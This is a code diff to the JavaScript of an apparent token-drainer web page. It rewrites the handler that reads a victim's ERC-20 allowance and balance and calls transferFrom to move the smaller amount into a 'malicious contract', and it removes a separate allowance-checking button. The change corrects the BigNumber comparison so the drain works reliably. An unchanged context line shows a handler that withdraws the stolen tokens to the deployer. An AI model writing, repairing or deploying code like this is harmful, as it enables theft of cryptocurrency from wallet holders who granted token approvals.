@@ -286,31 +286,28 @@
             }
         }
 
-        // Check the allowance for the malicious contract to spend tokens on the victim's behalf
-        document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
-            const victimAddress = prompt("Enter victim's wallet address:");
-            if (victimAddress) {
-                const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-                alert(`Victim's allowance: ${web3.utils.fromWei(allowance, "ether")} tokens`);
-            }
-        });
+      document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+    const victimAddress = prompt("Enter victim's wallet address:");
+    if (victimAddress) {
+        const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+        const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+        
+        // Convert allowance and balance to a BigNumber object to avoid overflow issues
+        const allowanceBN = web3.utils.toBN(allowance);
+        const balanceBN = web3.utils.toBN(balance);
 
-        // Withdraw tokens from the victim to the malicious contract (using transferFrom)
-        document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-            const victimAddress = prompt("Enter victim's wallet address:");
-            if (victimAddress) {
-                const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-                const balance = await tokenContract.methods.balanceOf(victimAddress).call();
-                const amountToTransfer = Math.min(web3.utils.toBN(allowance), web3.utils.toBN(balance));
-                
-                if (amountToTransfer > 0) {
-                    await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountToTransfer).send({ from: victimAddress });
-                    alert(`Transferred ${web3.utils.fromWei(amountToTransfer, "ether")} tokens from the victim to the malicious contract.`);
-                } else {
-                    alert("No tokens available for transfer.");
-                }
-            }
-        });
+        // Use the minimum of allowance and balance
+        const amountToTransfer = allowanceBN.lt(balanceBN) ? allowanceBN : balanceBN;
+
+        if (amountToTransfer.gt(web3.utils.toBN(0))) {
+            await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountToTransfer).send({ from: victimAddress });
+            alert(`Transferred ${web3.utils.fromWei(amountToTransfer, "ether")} tokens from the victim to the malicious contract.`);
+        } else {
+            alert("No tokens available for transfer.");
+        }
+    }
+});
+
 
         // Withdraw all tokens from the malicious contract to the deployer's address
         document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
